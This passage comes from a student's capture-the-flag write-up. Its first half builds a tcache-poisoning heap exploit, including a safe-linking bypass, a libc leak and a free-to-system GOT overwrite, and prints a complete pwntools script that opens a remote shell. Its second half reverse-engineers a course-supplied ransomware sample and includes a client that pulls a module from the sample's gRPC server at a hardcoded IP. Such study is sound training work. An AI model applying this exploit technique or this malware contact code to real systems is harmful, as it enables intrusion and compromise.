- when we put `\xff` **==the while breaks and so nothing is read as content to put in the bot==** `identifier`.

So when we allocate a bot with `\xff` we are allocating a bot taking as content the content of the `tcache bin` and so the `L shifted by 12 bits` secret only.

In fact, when we print it we will obtain this secret.

Let's see what happens if we run the current script:
```shell
python3 exploit.py
```

The result is:
- ![[Pasted image 20240529152145.png]]

==**So in this run the secret L shifted by 12 is:**== `\xad\x06\x00\x00\x00\x00\x00\x00`

We can notice that it changes on every execution:
- ![[Pasted image 20240529152247.png]]
- ![[Pasted image 20240529152258.png]]
- etc



So at this point we need to understand which is the real `system`  function address, to do it we need to leak the `libc` base address...

We can do it always using the `Tcache poisoning attack`.

### System address leaking

```python
#this one from ghidra
puts_got = 0x4041b0

# to bypass the safe linking
xored_puts_address = puts_got ^ leaked_L_shifted

# deallocate bot id 0
deallocate_bot(0)

# deallocate bot id 1
deallocate_bot(1)

# overwrite xored puts address in the deallocated bot id 1
change_deallocated_bot(1, xored_puts_address, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff')

# allocate bot id 0 we need it because malloc uses this implementation, the first malloc will not return the address of leaked puts
allocate_bot(0, 16, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff')

#allocate bot id 1 to leak the puts real address
allocate_bot(1, 16, b'\xff')

leaked_puts = call_atttack_function_to_leak_data(1)

  

print('xored puts address:', p64(xored_puts_address))

print('leaked puts address:', p64(leaked_puts))
```


#### So what we are doing here?

Here we need to leak the real address of a function that is included from the libc in the binary we have.
- ==**this because it has the PIE not enabled**==

Now, we don't have in our binary the function `system` so we need to leak one that is present in it.

It this case we can use the `puts` function.

**==To leak the real address of this function what we need to do is to find the GOT entry of this function in the binary file. So we will use ghidra:==**
- ![[Pasted image 20240529160645.png]]
	- in the useful section of the program tree we can see the GOT entry address of `puts` that is `0x4041b0`


**==The main idea here is:==**
1. **==we get the GOT entry of== `puts` ==from ghidra==**
2. ==**we deallocate 2 botnames**==
3. ==**we overwrite a deallocated bin putting in it the GOT entry of== `puts` ==this will overwrite its metadata (this will overwrite the bin on the head of the list)**==
	1. so the first bin in the linked list will have as metadata the `puts` address
4. ==**we allocate a new bot with arbitrary values, here== `\x00` ==values**==
	1. this will force the first bin to set as next bin address that can be allocated the address of the current deallocated bin metadata, so the real `puts`address 
2. ==**we allocate a new botname with**== `\xff` ==**that will stop the chars reading**==
	1. since the current bin is corrupted because it points to the real address of the `puts` function this allocation will put in the new allocated botname `identifier` the `puts` address

Since the metadata rewriting is protected by the Safe Linking we have to xor our `puts` GOT entry address with the leaked secret `L shifted by 12 bits`, as we did here:
```python
xored_puts_address = puts_got ^ leaked_L_shifted
```


So our bot with `id` contains the real `puts` address and with the line:
```python
leaked_puts = call_atttack_function_to_leak_data(1)
```
- we are extracting it



At this point we can extract the libc base address and the `system` function address...

```python
print('xored puts address:', p64(xored_puts_address))
print('leaked puts address:', p64(leaked_puts))

libc_base = calculate_libc_base(leaked_puts)

system_real_address = calculate_system_address(libc_base)

xored_free_address = free_got ^ leaked_L_shifted
```

Where these function are:
```python
def calculate_libc_base(leaked_puts):
	# readelf -s libc.so.6 | grep puts
	puts_offset = 0x7af40
	libc_base = leaked_puts - puts_offset
	return libc_base
```
- but where did we found this address `0x7af40` ?
	- ==**we got it from the file**== `libc.so.6`  ==**using the command**== `readelf -s libc.so.6 | grep puts` 
		- ![[Pasted image 20240529155600.png]]
	- this file is the libc used by the remote server
	- the address `puts_from_library` represents the offset from the base address of the libc and it is always fixed (so if the library used on the server is the same version of the one we have we will have the same offsets)
- **==So the libc base address is easily the difference between the real address of the==** `puts` ==**we leaked and the fixed offset retrieved by the**== `libc.so.6` ==**file**==

```python
def calculate_system_address(libc_base):
	# readelf -s libc.so.6 | grep system
	system_offset = 0x4ebf0
	system_real_address = system_offset + libc_base
	return system_real_address
```
- but where did we found this address `0x4ebf0` ?
	- ==**we got it from the file** ==`libc.so.6`  ==**using the command**== `readelf -s libc.so.6 | grep system` 
		- ![[Pasted image 20240529155622.png]]
	- the address `system_offset` represents the offset from the base address of the libc and it is always fixed
- So the real `system` ==**address is easily the sum between the**== `libc base` ==**and the** ==`system offset`


At this point we have all the pieces to perform our attack...

### free GOT entry overwriting with the system address
```python
#ghidra in section .got.plt
free_got = 0x404148

# choose an aligned address near free_got to overwrite it indirectly -> free is 0x404148
aligned_address = 0x404140


# overwrite the chosen aligned address with the system address indirectly
deallocate_bot(2)
deallocate_bot(3)

  

# Write the xored system address to the aligned address
change_deallocated_bot(3, aligned_address ^ leaked_L_shifted, b'\xff')

# allocate bot to put system address in the free got address
allocate_bot(2, 32, b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xff')

allocate_bot(3, 32, b'\x00\x00\x00\x00\x00\x00\x00\x00' + p64(system_real_address) + b'\xff')
```

#### So what we are doing here?

**==The main idea here is:==**
1. **==we get an aligned address near to the==** `free` ==**one form ghidra**==
2. ==**we deallocate 2 botnames==**
3. ==**we overwrite a deallocated bin putting in it the address of the aligned address near to ==`free` ==one, this will overwrite its metadata (this will overwrite the bin on the head of the list)**==
	1. so the first bin in the linked list will have as metadata the `aligned` address
4. **==we allocate a new bot with arbitrary values, here==** `a` ==**values**==
	1. <mark style="background: #BBFABBA6;">this will force the first bin to set as next bin address that can be allocated the address of the current deallocated bin metadata, so the</mark> `aligned` <mark style="background: #BBFABBA6;">address</mark> 
2. ==**we allocate a new botname with== `\xff`  ==(that stops the chars reading)**==
	1. since the current bin is corrupted because it points to the `aligned` address this allocation will put in the new allocated botname `identifier` the `aligned` address
3. **we call the allocation and so `malloc` passing to it 8 bytes `\x00` and then the `system` address**
	1. this allows us to hit the `free` GOT entry overwriting it with our `system` address

#### But why an aligned address and not the `free` address?
Here we want to overwrite the GOT entry of `free` function with the real `system` address we have found before.

To find the GOT entry of `free` we can access to the ghidra section `.got.plt`:
![[Pasted image 20240529161313.png]]
- we can see that the GOT entry address of the `free` function is `0x404148`

But if we use directly this address we will raise an exception because the address `0x404148` is not aligned, infact it is not divisible by 8:
- ![[Pasted image 20240529161536.png]]


**==We cannot fill the bin metadata with an unaligned address, so we have to use another approach.==**

We can find in this case the nearest address to `0x404148` that comes before and is aligned is `0x404240`.

**==Now, we know that the difference between them is 8 bytes, so our idea is:==**
- ==**fill the first 8 bytes with random stuff**== (in our case `\x00`) 
- ==**when we reach the 8th byte, let's start to write from it the**== `system` **==real address==**

In this way we will hit the `free` GOT entry address with the `system` address.

```python
allocate_bot(3, 32, b'\x00\x00\x00\x00\x00\x00\x00\x00' + p64(system_real_address) + b'\xff')
```
- this line will do it, with `malloc` we are writing starting from address `0x404240` 8 bytes of `\x00` and then the `system` function real address


##### But, why we need to allocate a 32 bytes botname in this case?
Well we need it because of the implementation of the reading function...
Let's take a look in ghidra:
- ![[Pasted image 20240609150505.png]]
	- At line 18 we can see that when we have read the number of bytes equal to the length we chose ( in this case `param_2` ) the next position of `param_1` is set to `/0` that is the terminator string
	- This because we can see that `local_20 = param_1` at line 12

==**We can understand that the last byte is set to null after the setting of the previous bytes...**==

This means that when we write 8 bytes of `\x00` and then the address of `system` we are writing 16 bytes. 
- So in this case the 17th byte will be overwritten with `NULL`. 
- But the 17th byte is the first byte of the `puts` function address that is a function used in the program to print strings and that is called in the `attack` function we use to perform our attack
	- this will lead us to the raising of an exception because the `puts` address is corrupted

**==So we use 32 byte botnames in order to set the 33th byte to `NULL` that will overwrite a memory address byte that doesn't matter for us...==**



### Gain a shell

At this point we have overwritten the `free` GOT entry, so each call to `free` from now will trigger a real call to `system`.

So what we can do is to allocate a bot that contains `/bin/sh` as botname, and so that allocates the string `/bin/sh`.

After that we have just to deallocate this bot in order to trigger:
- `free` on `/bin/sh` that will trigger instead `system("/bin/sh")`

So we can easily do:
```python
# allocate a new bot with '/bin/sh' in it and call free on it to obtain system('/bin/sh')
allocate_bot(9, 16, b'/bin/sh\x00\xff')

p.sendline(b'2') # remove bot

p.sendline(str(9).encode()) # bot id

p.interactive()
```
- we wrap `\x00` to the string as terminator char



### Final exploit 

The final exploit is:
```python
from pwn import *

context(os="Linux", arch="amd64")

#p = gdb.debug('./chall', 'b *0x00401469')
p = remote('cyberphant0m.sas.hackthe.space', '65432')

# Addresses used in the exploit 
#this one from ghidra
puts_got = 0x4041b0



def allocate_bot(bot_id, length, identifier):
    p.sendline(b'1')  # add bot
    p.sendline(str(bot_id).encode())  # bot id
    p.sendline(str(length).encode())  # bot length
    p.sendline(identifier)  # bot identifier
    output = p.recvuntil(f'Added botnet to index {bot_id}\n'.encode())
    print(output.decode())


def deallocate_bot(bot_id):
    p.sendline(b'2')  # remove bot
    p.sendline(str(bot_id).encode())  # bot id
    output = p.recvuntil(f'Botnet index (0-9): Removed index {bot_id}\n'.encode())
    print(output)


def call_atttack_function_to_leak_data(bot_id):
    p.sendline(b'3')
    output = p.recvuntil(f'ID:{bot_id}\n'.encode())
    print(output)
    leaked_L_shifted = p.recvline().strip()[:8].ljust(8, b'\x00')
    leaked_L_shifted = u64(leaked_L_shifted)
    return leaked_L_shifted


def change_deallocated_bot(bot_id, address, payload):
    p.sendline(b'-1')  # change deallocated bot
    p.sendline(str(bot_id).encode())
    p.send(p64(address))
    p.sendline(payload)
    p.sendline(b'aaa')  # to avoid maintenance variable set to 1
    output = p.recvuntil(b'Invalid option\n')
    print(output.decode())


def calculate_libc_base(leaked_puts):
    puts_offset = 0x7af40
    libc_base = leaked_puts - puts_offset
    return libc_base


def calculate_system_address(libc_base):
    # readelf -s libc.so.6 | grep system
    system_offset = 0x4ebf0
    system_real_address = system_offset + libc_base
    return system_real_address


# allocation of 3 bots
allocate_bot(0, 16, b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
allocate_bot(1, 16, b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
allocate_bot(2, 32, b'cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')
allocate_bot(3, 32, b'dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd')

# deallcoate bot id 0 
deallocate_bot(0)

# allocate bot 0 passing only \xff to get his metadata (L shifted)
allocate_bot(0, 16, b'\xff')

# leak L shifted by 12
leaked_L_shifted = call_atttack_function_to_leak_data(0)
print(p64(leaked_L_shifted))

# to bypass the safe linking 
xored_puts_address = puts_got ^ leaked_L_shifted

# deallocate bot id 0
deallocate_bot(0)

# deallocate bot id 1
deallocate_bot(1)

# overwrite xored put address in the deallocated bot id 1 
change_deallocated_bot(1, xored_puts_address, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff')

# allocate bot id 0 we need it because malloc uses this implementation, the first malloc will not return the address of leaked puts
allocate_bot(0, 16, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff')

#allocate bot id 1 to leak the puts real address
allocate_bot(1, 16, b'\xff')

leaked_puts = call_atttack_function_to_leak_data(1)

print('xored puts address:', p64(xored_puts_address))
print('leaked puts address:', p64(leaked_puts))

libc_base = calculate_libc_base(leaked_puts)
system_real_address = calculate_system_address(libc_base)


#ghidra in section .got.plt
free_got = 0x404148

# choose an aligned address near free_got to overwrite it indirectly -> free is 0x404148
aligned_address = 0x404140

# overwrite the chosen aligned address with the system address indirectly
deallocate_bot(2)
deallocate_bot(3)

# Write the xored system address to the aligned address
change_deallocated_bot(3, aligned_address ^ leaked_L_shifted, b'\xff')


#change_deallocated_bot(3, xored_free_address, b'\x00' * 8 + b'\xff' )

# allocate bot to put system address in the free got address
allocate_bot(2, 32, b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xff')
allocate_bot(3, 32, b'\x00\x00\x00\x00\x00\x00\x00\x00' + p64(system_real_address) + b'\xff')

# allocate a new bot with '/bin/sh' in it and call free on it to obtain system('/bin/sh')
allocate_bot(9, 16, b'/bin/sh\x00\xff')

print(hex(system_real_address))

p.sendline(b'2')  # remove bot
p.sendline(str(9).encode())  # bot id



p.interactive()
```

**==So run it and get the shell on the remote host:==**
```shell
python3 exploit.py
```

The result is:
- ![[Pasted image 20240529163705.png]]


<mark style="background: #BBFABBA6;">The flag for the part 2 is:</mark> `FLG_{m0r3_l1k3_un54f3_l1nk1n6}`


# Challenge part 3-4

## Introduction
We can access to these challengse through [challenge part 3](https://sas.hackthe.space/#/challenges/Binary%2010) [challenge part 4](https://sas.hackthe.space/#/challenges/Binary%2011)

From the description of the flag we don't get many useful information.

We just understand that:
```
You will need the following information:

- The [file bundle](https://sas.hackthe.space/cms/files/15de5f33f88248bee0ca063b1f225805e57e5d5b380d21ca7b076559d320b79f/wannalmao.zip).
- The flag regex is `FLG_\{[a-z0-9_]+\}`

Recommended tools:

- Windows 10 VM with [FlareVM toolkit](https://github.com/mandiant/flare-vm) installed, and internet connectivity
- IDA/Ghidra
- ILSpy
- Other tools found in FlareVM (PE studio, DetectItEasy, hex editors, etc.)

**Important note:**

- Execute the binary in a Windows 10 VM environment only.
- It can take 1-2 minutes for the ransomware to start on first startup, as it silently downloads some dependencies in the background, so be patient. Subsequent starts should be faster.
- It encrypts .txt files contained in the directory of the executable. Do not run it on the host machine. You can do static analysis on the host machine, though.
- You will encounter various anti-debug/obfuscation techniques discussed in the lecture.
- There are two flags. Submit the first one here and the final flag in the [Binary 11](https://sas.hackthe.space/#/challenges/Binary%2011) submission form.
- 
```
- **==we can download the everything we need from [here](https://sas.hackthe.space/cms/files/15de5f33f88248bee0ca063b1f225805e57e5d5b380d21ca7b076559d320b79f/wannalmao.zip)==**
- **==we will encounter various anti-debug/obfuscation techniques==** 


We download the files and we can see that it contains:
- ![[Pasted image 20240531213351.png]]
**==We are pretty sure that the flag is contained in==** `flag.txt.encrypted` **==and that we need to decrypt it...==**

So let's start to analyze the malware with a static analysis.

<mark style="background: #FF5582A6;">We will focus on the usage of the tools contained in the Flare-VM so, install it on a Windows 10 VM.</mark>


## Static analysis

The first thing we can do in order to retrieve some information is to **==use the tool DetectItEasy.==**

So we can easily open it and charge on it the `WANNALMAO.exe` file that turns to be the malware we need to reverse:
- ![[Pasted image 20240531132317.png]]


**==We can already notice that it uses a protection mechanism that is the packing.==****
**
>NOTE: **Packers are used to compress and/or encrypt an executable and dynamically decompress/decrypt it during execution**
>
>This makes the static analysis more difficult


However ==**DetectItEasy gives us some information and in fact we can understand that the packer**== `UPX` **==is used in this case to pack the code==**:
- ![[Pasted image 20240531132448.png]]



Another useful information can be retrieved from the section `Memory map`. **==This allows us to understand that there are 2 UPX sections in the binary file:==**
- ![[Pasted image 20240531132547.png]]

## Binary unpacking using UPX

So we can try to unpack it using the command line tool `UPX`:
![[Pasted image 20240531214000.png]]

Mhh, we are not able to unpack it directly, for sure this is a protection mechanism used by the malware creator...

So let's understand what happens.

<mark style="background: #BBFABBA6;">The first thing to do is to create a C++ file, compile it using</mark> `g++`, <mark style="background: #BBFABBA6;">pack it using</mark> `UPX`.

<mark style="background: #BBFABBA6;">This gives us the possibility to have in our hand a "unprotected" packed binary, and so we can see in this way how a normal packed binary is formed.
</mark>


### Normal packed binary creation
First of all we need to install `g++` on our `Windows 10` VM.

We can easily do it following this guide here : 
- [https://www3.cs.stonybrook.edu/~alee/g++/g++.html](https://www3.cs.stonybrook.edu/~alee/g++/g++.html)


At this point we are able to create a normal packed binary.

First of all we have to create a dummy C++ file...

For example:
```C++
#include <iostream>

int main(){
	std::cout<<"hello";
}

```
- we can rename it as `hello.cpp`
- ![[Pasted image 20240531214610.png]]


Now we compile it in a `.exe` file using this command on the `powershell`:
```shell
g++ -o hello.exe hello.cpp
```
- ![[Pasted image 20240531214914.png]]

At this point we have a `.exe` binary file that we can pack...


**==To pack it we will use the command==** `upx` ==**on the**== `powershell` :
```shell
upx hello.exe
```
- ![[Pasted image 20240531214940.png]]


Perfect! Now let's see the difference between it and the `WANNLMAO.exe` packed file.

### Difference between hello.exe and WANNALMAO.exe
To do it we need to open them using an hex editor.

Fortunately Flare-VM has them:
- ![[Pasted image 20240531215128.png]]


### Using 010 Editor
So we open `010 Editor` and we open in it `hello.exe` and `WANNALMAO.exe`


The output of the editor will be:
1. `hello.exe`
	1. ![[Pasted image 20240531215420.png]]
2. `WANNALMAO.exe`
	1. ![[Pasted image 20240531215404.png]]




If we study them we can see that they have some difference on the `SectionHeaders` part.

==**In fact we can see that**== `hello.exe` ==**has the values** ==`UPX1`, `UPX2`, `UPX!` ==**in it, that are not present in**== `WANNALMAO`:
1. `hello.exe`
	1. ![[Pasted image 20240531215622.png]]
2. `WANNALMAO.exe`
	1. ![[Pasted image 20240531215654.png]]



So let's try to adjust it putting the correct `headers` value also in `WANNLMAO`:
 - ![[Pasted image 20240531215756.png]]
	 - ==**look at the orange values added :)**==


At this point also `WANNALMAO.exe` is aligned to `UPX` standard... So save it and let's try to unpack it.

### WANNALMAO.exe unpacking
Let's use the `upx` command from the `powershell`:
```shell
upx -d WANNALMAO.exe
```
- ![[Pasted image 20240531220008.png]]
-  `-d` is used to unpack packed files with `UPX`

**==It worked... Perfect!==**



## Static analysis of the unpacked WANNALMAO.exe

At this point we can open the unpacked `WANNALMAO.exe` file using ghidra:
- ![[Pasted image 20240531220223.png]]


==**We can start to study the functions in it and we can notice an interesting part that is the** ==`Exports` ==**part...**==
- ![[Pasted image 20240531220316.png]]

So let's start from the function `WANNALMAO_PrepareEnvironment`, that has an interesting name...


### WANNALMAO_PrepareEnvironment analysis

The function turns to be this one:
- ![[Pasted image 20240531221456.png]]
- ![[Pasted image 20240531221522.png]]


==**If we follow the code flow we can notice that it seems to load a**== `.dll` ==**file called**== `verysus.dll` ==**from resources...**==
-  ![[Pasted image 20240531221546.png]]


So what we want to do now is to try to extract this `.dll` file...


So let's use `x64gdb` to do that. 

We will put a break point on the function `WANNALMAO_WriteToFile` since it seems to be the function used to store the `.dll` file on a folder on the machine...

### verysus.dll extraction
Let's open `x64gdb` and upload in it `WANNALMAO.exe` (the unpacked one)...
- ![[Pasted image 20240531221929.png]]



==**At this point we will put a breakpoint to**== `WANNALMAO_WriteToFile`: 
- ![[Pasted image 20240531222144.png]]

It says that is not valid as address. **==So let's try to put it on==** `GetEnvironmentVariableA`, ==**since it executed before**== `WANNALMAO_WriteToFile` ==**function:**==
- ![[Pasted image 20240531222306.png]]

>NOTE: We will reach the point we need using the step by step debugger

In `breakpoints section` we can see it correctly setted:
- ![[Pasted image 20240531222338.png]]


So let's start the malware, clicking the row:
- ![[Pasted image 20240609152313.png]]



**==We will continue to click on it until we reach the breakpoint we set:==**
- ![[Pasted image 20240531222431.png]]

**==Perfect, at this point we can start to go one step per time. The idea is to reach the code after the line:==**
- ![[Pasted image 20240531223010.png]]



To use step by step execution we have to click on this button:
- ![[Pasted image 20240609152249.png]]


So basically we continue the debug step by step to reach this point:
- ![[Pasted image 20240531222813.png]]


Now, we can understand that this `verysus.dll` file is stored in the `%TEMP%` forlder, a windows folder for temporary files... this because the variable `TEMP` the malware gets is basically this folder.

**==In addition it seems to construct the path==** `TEMP\WANNALMAO\verysus.dll`

So take a look into `%TEMP%` folder:
- ![[Pasted image 20240531223306.png]]


Bingo:
- ![[Pasted image 20240531223322.png]]

So let's see it:
- ![[Pasted image 20240531223351.png]]



Now we can study `verysus.dll` using ghidra...

## verysus.dll analysis using ghidra and intermediate flag getting

At this point we open it using ghidra:
![[Pasted image 20240531223803.png]]




==**And studying it we can see a very interesting stuff in the**== `Exports` ==**section:**==
- ![[Pasted image 20240531223551.png]]


At this point we can take a look at the functions in it and in the function `WANNALMAO_LoadCRL` we can find this:
- ![[Pasted image 20240531164324.png]]


It seems that we have found the intermediate flag...

<mark style="background: #BBFABBA6;">So the intermediate flag is:</mark> `FLG_PT3{n3st3d_l1k3_M4try0shk4_d0lls`



Let's continue our journey and let's try to figure out the other flag...

## verysus.dll WANNALMAO_LoadCLR function analysis
At this point we can focus on the functions contained in the `verysus.dll` file...

We can notice that there is an interesting function `WANNALMAO_LoadCLR` in it that seems to load something:
- ![[Pasted image 20240602155224.png]]

==**We can understand that something is dynamically decrypted, decompressed and loaded looking at the lines:**==
- ![[Pasted image 20240602155452.png]]


### WANNALMAO_Decrypt_XOR function analysis

If we enter in the `WANNALMAO_DecryptXOR` ==**we can see that it is a decryption function that uses the XOR operation to decrypt chars:**==
- ![[Pasted image 20240602155556.png]]

So what it really does is taking an array of chars, the length of this array of chars and it seems to take also an array of chars that seems to be a `key`, here called `param_3`. 

The variable `param_4` seems to be the length of the key...

The main idea here is to:
1. ==**iterate over the array of chars**==
2. ==**perform the XOR between the current read char (index i) and the key char at position index i % key length.**== 
	1. This to rotate the key when the length of the array char is greater than the key one.

In addition we can see in the `WANNALMAO_LoadCLR` that <mark style="background: #FF5582A6;">the key used is</mark> `WANNALMAO`.

In fact we can notice:
- ![[Pasted image 20240602161623.png]]
-  if we convert the bytes in chars we can see:
	- ![[Pasted image 20240602161807.png]]

![[Pasted image 20240602161737.png]]



After this we can see that the decrypted value is decompressed.
### WANNALMAO_DecompressZstd function analysis
<mark style="background: #FF5582A6;">Here we can easily understand that the Zstandard (Zstd) decompression algorithm is used to decompress the decrypted data...</mark>

>NOTE: **Zstandard (Zstd) is a high-performance data compression algorithm developed by Facebook. It's designed to provide very fast and efficient compression from compressing low-latency data on mobile devices to compressing large datasets on servers.**

**==We can be pretty sure that nothing different form the original algorithm is done, because it is a standard...==**


At this point we have to understand what is going on in this code, and so what is effectively decrypted and decompressed.

## verysus.dll resource extracting

==**We could think that what is decrypted and decompressed is some type of resources.**== So let's try to extract the resources of `verysus.dll` using the tool `Hacker Resource` we can find in `Flare-VM`.


The first thing to do is try to extract the resources from the original malware `WANNLMAO.exe` in order to see if we found something:
- ![[Pasted image 20240602160858.png]]

Here we can see that `verysus` has 2 different resources... Maybe is what we are searching for.

So let's save them as `.bin` files:
- ![[Pasted image 20240602161008.png]]


The result will be:
- ![[Pasted image 20240602161039.png]]


At this point we need to figure out a way to try to decrypt them and decompress them using `Zstd` algorithm...

Fortunately we can use `python` that helps us in this activities.

So let's write a python script:
```python
import zstandard as zstd

def xor_decrypt(data, key):
    decrypted = bytearray(len(data))
    key_len = len(key)
    
    for i in range(len(data)):
        decrypted[i] = data[i] ^ key[i % key_len]
    
    return decrypted

def decompress_zstd(data):
    decompressor = zstd.ZstdDecompressor()
    decompressed = decompressor.decompress(data)
    return decompressed

with open('VERYSUS101.bin', 'rb') as f:
    encrypted_data_1 = f.read()
with open('VERYSUS102.bin', 'rb') as f:
    encrypted_data_2 = f.read()


key = bytearray("WANNALMAO", 'utf-8')

try:
    decrypted_data_1 = xor_decrypt(encrypted_data_1, key)
    decompressed_data_1 = decompress_zstd(decrypted_data_1)
    with open('verysus101.decrypted', 'wb') as f:
        f.write(decompressed_data_1)
    
    print("VERYSUS 101 done")
except Exception as e:
    print(e)

try:
    decrypted_data_2 = xor_decrypt(encrypted_data_2, key)
    decompressed_data_2 = decompress_zstd(decrypted_data_2)
    with open('verysus102.decrypted', 'wb') as f:
        f.write(decompressed_data_2)
    print("VERYSUS 102 done")
    
except Exception as e:
    print(e)
```
- we save it in a file called `xor_decrypt_and_decompress.py`



<mark style="background: #BBFABBA6;">You can install python on windows using this guide:</mark>
- [https://www.digitalocean.com/community/tutorials/install-python-windows-10](https://www.digitalocean.com/community/tutorials/install-python-windows-10)




**==At this point we can execute the script to see what happens:==**
- ![[Pasted image 20240602164003.png]]
- ![[Pasted image 20240602164030.png]]


The result will be:
- ![[Pasted image 20240602164050.png]]

>NOTE: remember to install the modules we need using `pip3 install module_name` in powershell


So we are only able to decrypt and decompress the `VERYSUS102` file but not `VERYSUS101`.


At this point we can analyze this decrypted file using `ILSpy` to see if we get some info...

## VERYSUS102 analysis using ILSpy

**==We open it using ILSpy and we can see:==**
- ![[Pasted image 20240602164345.png]]

It contains code and seems to be a `.NETCoreApp` written in `C#`.


<mark style="background: #FF5582A6;">One relevant thing is the presence of the variable</mark> `__token`:
- ![[Pasted image 20240602164505.png]]

However we can focus now on the code and we focus on the function `MainWindow`.


### MainWindow function analysis

This function turns to be very interesting:
- ![[Pasted image 20240602164640.png]]

It seems to perform a request to a server using `gRPC`:
- ![[Pasted image 20240602165108.png]]

>NOTE: 
>**gRPC is an open-source Remote Procedure Call (RPC) framework developed by Google. It enables clients and servers to communicate with each other efficiently and reliably across different programming languages and platforms.**
>
>gRPC is based on Protocol Buffers (protobuf) and uses `.proto` files to define service interfaces and message types.
>
 `.proto` **==files define the structure of the data that will be exchanged between the client and the server. They contain definitions for messages, services, and service methods.==**



After this **==it seems to get the field==** `Module` **==from the response and to==** `XOR` **==its bytes with the value==** `0x3F`:
- ![[Pasted image 20240602165217.png]]

From this "decrypted" data it seems to extract a module called `Encryptor`:
- ![[Pasted image 20240602165346.png]]

At this point it loads the method `encrypt` and uses it:
- ![[Pasted image 20240602165423.png]]

So it seems to be the code used to perform the victim machine file encryption when we run the malware...


Let's understand how the `gRPC` client is managed in this context.


### gRPC Service Provider extraction
If we study the content of `verysus102` we can see that it has in the resources a `.dll` file that seems to be the `gRPC` service provider...
- ![[Pasted image 20240602165601.png]]
	- let's save it ![[Pasted image 20240602165759.png]]

At this point we have this file:
- ![[Pasted image 20240602165836.png]]



### WANNALMAO.GrpcServiceProvider.dll  analysis with ILSpy
Let's open it using ILSpy:
- ![[Pasted image 20240602170000.png]]


<mark style="background: #FF5582A6;">First of all we can notice that the url on which the request is done is:</mark>
- `http://37.252.189.176:50051`

Playing around we can notice that <mark style="background: #BBFABBA6;">if we want to perform a request to this</mark> `gRPC` service <mark style="background: #BBFABBA6;">we need to construct a request that is formed by:</mark>
- `module type`
- `token`
- `os version`
- ![[Pasted image 20240602170431.png]]

From this section :
- ![[Pasted image 20240602170547.png]]

We can notice that for the module types we have 2 different possibilities:
- ![[Pasted image 20240602170528.png]]




<mark style="background: #BBFABBA6;">So maybe our idea now could be try to perform a request to the</mark> `gRPC` <mark style="background: #BBFABBA6;">server using the</mark> `token` <mark style="background: #BBFABBA6;">we found in the</mark> `MainWindow` <mark style="background: #BBFABBA6;">code, the</mark> `module type` `MODULE_DECRYPT` <mark style="background: #BBFABBA6;">and a dummy</mark> `os version`.



To do that we can use python... but we first need to obtain the definition of the `.proto` file used by the `gRPC` server...

So let's go back to analyze `MainWindow`, maybe we can find something there...



## .proto file finding

Having a look another time at `MainWindow` in `verysus102` **==we can find the functionality==** `About Us` ==**that basically opens in the browser a**== `url` ==**that points on a twitter profile...**==
- ![[Pasted image 20240602171031.png]]

Let's have a look at this profile:
- ![[Pasted image 20240602171144.png]]

In the posts we can find this picture:
- ![[Pasted image 20240602171209.png]]

BINGO... we have the `.proto` file ( or at least we hope :) )



So let's try if we are able to perform a request to the `gRPC` server leveraging on this `service.proto` file...

We can write it into a file called  `service.proto` :) 
```C
syntax = "proto3";

option csharp_namespace = "GrpcServiceProvider";

service RansomService {
    rpc GetModule(ModuleRequest) returns (ModuleResponse);
}

message ModuleRequest{
    ModuleType module_type = 1;
    string token = 2;
    string os_version = 3;

}

message ModuleResponse{
    Status status = 1;
    bytes module = 2;
}

enum ModuleType{
    MODULE_DECRYPT = 0;
    MODULE_ENCRYPT = 1;
}

enum Status {
    STATUS_OK = 0;
    STATUS_INVALID_TOKEN = 1;
    STATUS_ERROR = 2;
    STATUS_MODULE_NOT_FOUND = 3;
}

```


At this point we can setup our environment in order to use python.

To do that we have first to install some python modules `grpcio` and `grpcio-tools`

Then we can use them to prepare our environment:
```shell
python -m grpc_tools.protoc --proto_path=. --python_out=. --grpc_python_out=. service.proto
```
- ![[Pasted image 20240602173717.png]]

At this point you will find these files in the directory where is `service.proto`:
- ![[Pasted image 20240602172509.png]]


Perfect...
Let's write our client that performs a request to the `gRPC` server:
```python

import grpc
import service_pb2
import service_pb2_grpc

import base64


with grpc.insecure_channel('37.252.189.176:50051') as channel:
    stub = service_pb2_grpc.RansomServiceStub(channel)

    request = service_pb2.ModuleRequest(
        module_type=service_pb2.ModuleType.MODULE_DECRYPT,
        token='1b426547968422e0c6d02ee1130cac1b028d7910b1827a70c1d529410fa45ba3',
        os_version='Microsoft Windows NT 10.0.19042.0'
    )

    response = stub.GetModule(request)
    module = response.module

    # response xoring and saving
    module_bytes = bytes([b ^ 0x3F for b in module])
    dll_file_path = 'decryptor.dll' 
    
with open(dll_file_path, 'wb') as dll_file:
    dll_file.write(module_bytes)

```
- save it as `get_decryptor.py`

So what we are doing here?
1. **==we perform a connection with the server==**
2. ==**we send a request that contains as** ==
	1. `module_type` `MODULE_DECRYPT` <mark style="background: #BBFABBA6;">hoping we will obtain the code that is really used to perform a decryption</mark>
	2. `token` <mark style="background: #BBFABBA6;">the token found</mark> in `verysus102` `MainWindow` file
	3. `os_version` a dummy Windows 10 version
3. ==**we get the response and we get the**== `module` ==**field of the response**==
4. we `xor` **==the module we got using the technique we have seen in==** `MainWindow`
5. ==**we write the result of the**== `xoring` ==**in a**== `decryptor.dll` file, because we are pretty sure it is another `.NETCoreApp` written in C# 

